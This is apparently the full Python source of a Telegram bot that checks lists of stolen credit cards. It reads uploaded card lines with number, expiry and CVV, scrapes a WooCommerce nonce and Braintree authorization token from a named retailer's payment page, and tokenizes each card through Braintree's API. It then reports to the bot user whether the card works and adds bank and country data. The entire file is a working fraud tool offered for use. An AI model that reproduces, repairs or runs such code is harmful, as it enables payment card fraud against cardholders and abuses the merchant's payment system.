import os
import random
import telebot
import requests
import json
import base64
from telebot import types
from re import findall

def binn(bin, c, re):
    response = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
    if 'Invalid BIN' in response.text or 'not found.' in response.text or 'Error code 521' in response.text or 'cloudflare' in response.text:
        binnn, brand, country_name, country_flag, country_currencies, bank, level, type = ('None',) * 8
    else:
        js = response.json()
        binnn = js.get('bin', 'None')
        brand = js.get('brand', 'None')
        country_name = js.get('country_name', 'None')
        country_flag = js.get('country_flag', 'None')
        country_currencies = js.get('country_currencies', ['None'])[0]
        bank = js.get('bank', 'None')
        level = js.get('level', 'None')
        type = js.get('type', 'None')
    
    return f"""*ア 𝘾𝘾 -» <code>{c}</code>
カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» <strong>Online</strong> ✅
零 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {re}
カ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» Braintree Auth
キ 𝘽𝙞𝙣 -» <code>{type} - {brand} - {level}</code>
朱 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>
ᥫ᭡ 𝙗𝙤𝙩 @M77SALAH"""

token = input('Enter your bot token: ')

# Deleting the webhook if it exists
url = f"https://api.telegram.org/bot{token}/deleteWebhook"
response = requests.get(url)
if response.status_code == 200:
    print("Webhook deleted successfully.")
else:
    print("Failed to delete webhook.")

# Initializing the bot
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id:
        bot.reply_to(message, "Hello Pro Bot\nPlease Send Cc List", parse_mode="markdown")

@bot.message_handler(content_types=['document'])
def send_file(message):
    session = requests.Session()
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name
        with open(file_name, 'wb') as f:
            f.write(downloaded_file)
    except Exception as e:
        bot.reply_to(message, text='Error Cc List')
        return

    key = types.InlineKeyboardMarkup(row_width=1)
    af = types.InlineKeyboardButton('OWNAR', url='https://t.me/ch4kscript')
    key.add(af)
    cc_list = open(file_name, "r").read().splitlines()
    cc_count = len(cc_list)
    bot.reply_to(message, text=f'Done Read Files Count: {cc_count}', reply_markup=key)

    # Example cookies list
    cookies_list = [
        "example_cookie_1",
        "example_cookie_2",
        "example_cookie_3"
    ]
    cookie = random.choice(cookies_list)

    headers = {
        'authority': 'bigbattery.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': cookie,
        'referer': 'https://bigbattery.com/my-account/payment-methods/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    
    # Make an initial request to retrieve nonce and authorization
    response = session.get('https://bigbattery.com/my-account/add-payment-method/', headers=headers)
    
    # Debugging output to check the response content
    print("Response status code:", response.status_code)
    print("Response text:", response.text[:1000])  # Print first 1000 characters of the response for debugging

    nonce_matches = findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
    if nonce_matches:
        nonce = nonce_matches[0]
    else:
        print("Nonce not found in the response.")
        bot.reply_to(message, text='Nonce not found.')
        return

    aut_matches = response.text.split('var wc_braintree_client_token')
    if len(aut_matches) > 1:
        aut = aut_matches[1].split('"')[1]
        base4 = str(base64.b64decode(aut))
        auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
    else:
        print("Authorization token not found in the response.")
        bot.reply_to(message, text='Authorization token not found.')
        return

    for cc_line in cc_list:
        cc_details = cc_line.strip().split('|')
        if len(cc_details) < 4:
            continue

        cc, exp, ex, cvc = cc_details[:4]
        exy = ex[-2:]  # Extracting last two digits of expiration year
        
        url = "https://payments.braintree-api.com/graphql"
        payload = json.dumps({
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "5f685625-f4b3-43db-ab05-f8a74dc449a0"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": exp,
                        "expirationYear": "20" + exy,
                        "cvv": cvc,
                        "billingAddress": {
                            "postalCode": "10080",
                            "streetAddress": ""
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        })

        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            'sec-ch-ua-mobile': "?0",
            'authorization': "Bearer " + auth,
            'braintree-version': "2018-05-10",
            'sec-ch-ua-platform': "\"Linux\"",
            'origin': "https://assets.braintreegateway.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://assets.braintreegateway.com/",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        response = session.post(url, headers=headers, data=payload)
        token_data = response.json()
        tokencc = token_data['data']['tokenizeCreditCard']['token']

        headers = {
            'accept': '*/*',
            'authorization': 'Bearer ' + auth,
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '499e9d01-0f2b-4a5c-9825-4e2e1e00a2fa'
            },
            'query': 'mutation PaymentMethodOptions($id: ID!) { node(id: $id) { ... on CreditCard { expirationMonth expirationYear bin brandCode last4 binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'id': tokencc
            },
            'operationName': 'PaymentMethodOptions'
        }

        response = session.post(url, headers=headers, json=json_data)
        bin_data = response.json()
        bin = bin_data['data']['node']['bin']
        result = binn(bin, cc, response.json())
        bot.send_message(message.chat.id, text=result, parse_mode="html")

bot.polling()